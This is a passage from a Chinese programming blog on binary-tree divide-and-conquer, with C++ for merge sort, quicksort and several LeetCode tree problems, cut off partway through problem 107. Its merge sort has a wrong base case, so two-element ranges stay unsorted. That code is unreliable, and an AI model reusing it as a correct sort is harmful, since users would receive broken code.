class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ResultType <span class="title">traversal</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    <span class="comment">// nil or leaf</span></span><br><span class="line">    <span class="keyword">if</span> (!root) {</span><br><span class="line">        <span class="comment">// do something and return</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Divide</span></span><br><span class="line">    <span class="keyword">auto</span> left = <span class="built_in">traversal</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">traversal</span>(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Conquer</span></span><br><span class="line">    <span class="keyword">auto</span> result = <span class="built_in">merge</span>(left, right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="典型示例"><a href="#典型示例" class="headerlink" title="典型示例"></a>典型示例</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// V2：通过分治法遍历二叉树</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preOrderTraversal</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">divideAndConquer</span>(root);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">divideAndConquer</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">    <span class="keyword">if</span> (!root) {</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 分治(Divide)</span></span><br><span class="line">    <span class="keyword">auto</span> left = <span class="built_in">divideAndConquer</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">divideAndConquer</span>(root-&gt;right);</span><br><span class="line">    <span class="comment">// 合并结果(Conquer)</span></span><br><span class="line">    result.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    result.<span class="built_in">insert</span>(result.<span class="built_in">end</span>(), left.<span class="built_in">begin</span>(), left.<span class="built_in">end</span>());</span><br><span class="line">    result.<span class="built_in">insert</span>(result.<span class="built_in">end</span>(), right.<span class="built_in">begin</span>(), right.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">MergeSort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> tmp = <span class="keyword">new</span> T[len];</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, <span class="number">0</span>, len - <span class="number">1</span>, tmp);</span><br><span class="line">    <span class="keyword">delete</span>[] tmp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">mergeSort</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end, T tmp[])</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (begin + <span class="number">1</span> &gt;= end) {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">auto</span> begin1 = begin;</span><br><span class="line">    <span class="keyword">auto</span> end1 = mid;</span><br><span class="line">    <span class="keyword">auto</span> begin2 = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> end2 = end;</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, begin1, end1, tmp);</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, begin2, end2, tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// merge two parts</span></span><br><span class="line">    <span class="keyword">auto</span> index = begin;</span><br><span class="line">    <span class="keyword">while</span> (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {</span><br><span class="line">        tmp[index++] = arr[begin1] &lt; arr[begin2] ? arr[begin1++] : arr[begin2++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (begin1 &lt;= end1) {</span><br><span class="line">        tmp[index++] = arr[begin1++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (begin2 &lt;= end2) {</span><br><span class="line">        tmp[index++] = arr[begin2++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i &lt;= end; ++i) {</span><br><span class="line">        arr[i] = tmp[i];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">QuickSort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>{</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quickSort</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (begin &gt;= end) {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">auto</span> pivot = <span class="built_in">partition</span>(arr, begin, end);</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, begin, pivot - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, pivot + <span class="number">1</span>, end);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">partition</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end)</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> base = arr[end];</span><br><span class="line">    <span class="keyword">auto</span> lessInsert = begin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i &lt; end; ++i) {</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; base) {</span><br><span class="line">            <span class="built_in">swap</span>(arr[lessInsert++], arr[i]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">swap</span>(arr[lessInsert], arr[end]);</span><br><span class="line">    <span class="keyword">return</span> lessInsert;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="常见题目示例"><a href="#常见题目示例" class="headerlink" title="常见题目示例"></a>常见题目示例</h4><h5 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> left=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> right=<span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">             <span class="keyword">return</span> left<span class="number">+1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> right<span class="number">+1</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="110-平衡二叉树"><a href="#110-平衡二叉树" class="headerlink" title="110. 平衡二叉树"></a><a href="https://leetcode-cn.com/problems/balanced-binary-tree/">110. 平衡二叉树</a></h5><blockquote><p>给定一个二叉树，判断它是否是高度平衡的二叉树。</p><p>本题中，一棵高度平衡二叉树定义为：</p><p>一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。</p><p>示例 1:</p><p>给定二叉树 [3,9,20,null,null,15,7]</p><p> 3<br>/ <br>9  20<br> /  <br>15   7<br>返回 true 。</p><p>示例 2:</p><p>给定二叉树 [1,2,2,3,3,null,null,4,4]</p><pre><code>1</code></pre><p>   / <br>  2   2<br> / <br>3   3<br>/ <br>4   4<br>返回 false 。</p></blockquote><h6 id="从底至顶"><a href="#从底至顶" class="headerlink" title="从底至顶"></a>从底至顶</h6><p>思路：分治法，左边平衡 &amp;&amp; 右边平衡 &amp;&amp; 左右两边高度 &lt;= 1， 因为需要返回是否平衡及高度，要么返回两个数据，要么合并两个数据， 所以用-1 表示不平衡，&gt;0 表示树高度（二义性：一个变量有两种含义）。</p><p>注意</p><blockquote><p>一般工程中，结果通过两个变量来返回，不建议用一个变量表示两种含义</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">maxDepth</span>(root)==<span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">      <span class="type">int</span> left=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">      <span class="type">int</span> right=<span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">      <span class="keyword">if</span>(left==<span class="number">-1</span>||right==<span class="number">-1</span>||left-right&gt;<span class="number">1</span>||right-left&gt;<span class="number">1</span>)</span><br><span class="line">      {</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">      {</span><br><span class="line">          <span class="keyword">return</span> left<span class="number">+1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> right<span class="number">+1</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124. 二叉树中的最大路径和"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. 二叉树中的最大路径和</a></h5><blockquote><p>给定一个非空二叉树，返回其最大路径和。</p><p>本题中，路径被定义为一条从树中任意节点出发，达到任意节点的序列。该路径至少包含一个节点，且不一定经过根节点。</p><p>示例 1:</p><p>输入: [1,2,3]</p><pre><code>1</code></pre><p>   / <br>  2   3</p><p>输出: 6<br>示例 2:</p><p>输入: [-10,9,20,null,null,15,7]</p><p>-10<br>/ <br>9  20<br> /  <br>15   7</p><p>输出: 42</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="type">int</span> res=INT_MIN;</span><br><span class="line">        <span class="built_in">helper</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(TreeNode*root,<span class="type">int</span> &amp;val)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left=<span class="built_in">max</span>(<span class="number">0</span>,<span class="built_in">helper</span>(root-&gt;left,val));</span><br><span class="line">        <span class="type">int</span> right=<span class="built_in">max</span>(<span class="number">0</span>,<span class="built_in">helper</span>(root-&gt;right,val));</span><br><span class="line">        <span class="type">int</span> lmr=root-&gt;val+left+right;</span><br><span class="line">        <span class="type">int</span> ret=root-&gt;val+<span class="built_in">max</span>(left,right);</span><br><span class="line">        val=<span class="built_in">max</span>(val,<span class="built_in">max</span>(lmr,ret));</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h5><blockquote><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p><a href="https://baike.baidu.com/item/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/8918834?fr=aladdin">百度百科</a>中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p><p>例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4]</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49261/binarytree.png" alt="img"></p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1</span><br><span class="line">输出: 3</span><br><span class="line">解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4</span><br><span class="line">输出: 5</span><br><span class="line">解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></tbody></table></figure></blockquote><p>思路：分治法，有左子树的公共祖先或者有右子树的公共祖先，就返回子树的祖先，否则返回根节点</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">         <span class="comment">// 相等 直接返回root节点即可</span></span><br><span class="line">        <span class="keyword">if</span>(root==p||root==q)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">auto</span> left=<span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        <span class="keyword">auto</span> right=<span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">          <span class="comment">// 左右两边都不为空，则根节点为祖先</span></span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="literal">NULL</span>&amp;&amp;right!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">if</span>(right!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="BFS-层次应用"><a href="#BFS-层次应用" class="headerlink" title="BFS 层次应用"></a>BFS 层次应用</h3><h5 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h5><blockquote><p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">           <span class="type">int</span> currentLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLevelSize;i++)</span><br><span class="line">           {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                level.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);               </span><br><span class="line">           }</span><br><span class="line">           res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="107-二叉树的层次遍历-II"><a href="#107-二叉树的层次遍历-II" class="headerlink" title="107. 二叉树的层次遍历 II"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal-ii/">107. 二叉树的层次遍历 II</a></h5><blockquote><p>给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）</p></blockquote><p>思路：在层级遍历的基础上，翻转一下结果即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree 